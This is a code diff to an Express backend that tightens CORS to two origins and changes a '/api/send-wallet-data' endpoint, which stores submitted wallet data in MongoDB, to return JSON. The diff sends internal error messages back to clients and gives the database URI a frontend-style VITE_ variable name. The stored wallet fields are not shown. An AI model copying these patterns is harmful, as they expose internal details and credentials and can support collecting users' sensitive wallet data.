@@ -6,30 +6,28 @@ require('dotenv').config();
 const app = express();
 
 // Configure CORS
-//const allowedOrigins = ['https://theblockchain.vercel.app/'];
-// app.use(cors({
-//   origin: (origin, callback) => {
-//     if (!origin || allowedOrigins.indexOf(origin) !== -1) {
-//       callback(null, true);
-//     } else {
-//       callback(new Error('Not allowed by CORS'));
-//     }
-//   }
-// }));
-const allowedOrigins = ['https://theblockchain.vercel.app','*'];
+const allowedOrigins = ['https://theblockchain.vercel.app', 'http://localhost:5173'];
 
 app.use(
   cors({
-    origin: allowedOrigins,
+    origin: function(origin, callback) {
+      if(!origin) return callback(null, true);
+      if(allowedOrigins.indexOf(origin) === -1){
+        var msg = 'The CORS policy for this site does not allow access from the specified Origin.';
+        return callback(new Error(msg), false);
+      }
+      return callback(null, true);
+    },
     credentials: true,
-    methods: "POST",
+    methods: ["POST", "GET", "OPTIONS"],
     optionsSuccessStatus: 200,
   })
 );
+
 app.use(express.json());
 
 // MongoDB connection
-mongoose.connect(process.env.MONGO_URI)
+mongoose.connect(process.env.VITE_MONGO_URI)
   .then(() => console.log('MongoDB connected'))
   .catch(err => console.log('MongoDB connection error:', err));
 
@@ -58,12 +56,13 @@ app.post('/api/send-wallet-data', async (req, res) => {
     });
 
     await newWallet.save();
-    res.status(200).send('Wallet connection successful');
+    res.status(200).json({ message: 'Wallet connection successful' });
   } catch (error) {
     console.error('Error connecting wallet data:', error);
-    res.status(500).send('Error connecting wallet data');
+    res.status(500).json({ error: 'Error connecting wallet data', details: error.message });
   }
 });
+
 app.get('/', (req, res) => {
   res.send('Welcome to the Blockchain Backend API');
 });
